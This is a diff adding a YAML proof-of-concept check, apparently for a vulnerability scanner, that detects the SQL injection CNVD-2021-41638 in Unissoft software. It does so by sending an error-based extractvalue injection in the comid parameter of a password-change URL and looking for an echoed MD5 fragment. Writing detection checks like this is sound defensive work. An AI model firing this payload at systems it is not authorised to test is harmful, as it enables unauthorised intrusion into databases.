@@ -1,0 +1,21 @@
+name: yaml-poc-unissoft-unissoft-sql_injection-CNVD-2021-41638
+binding: 388fe150-9c99-4523-bac3-5732a3138fc9
+detail:
+    author: luhan.xu
+    links:
+        - https://www.cnvd.org.cn/flaw/show/CNVD-2021-41638
+    vulnerability:
+        id: fd6c9cfa-e8c2-441f-9050-5dd101c6d39e
+        level: high
+    warning: Harmless
+transport: http
+set:
+    a1: randomInt(20000000, 90000000)
+rules:
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /login/Login/editPass.html?comid=extractvalue(1,concat(char(126),md5({{a1}})))
+        expression: response.body.bcontains(bytes(substr(md5(string(a1)), 1, 16)))
+expression: r1()
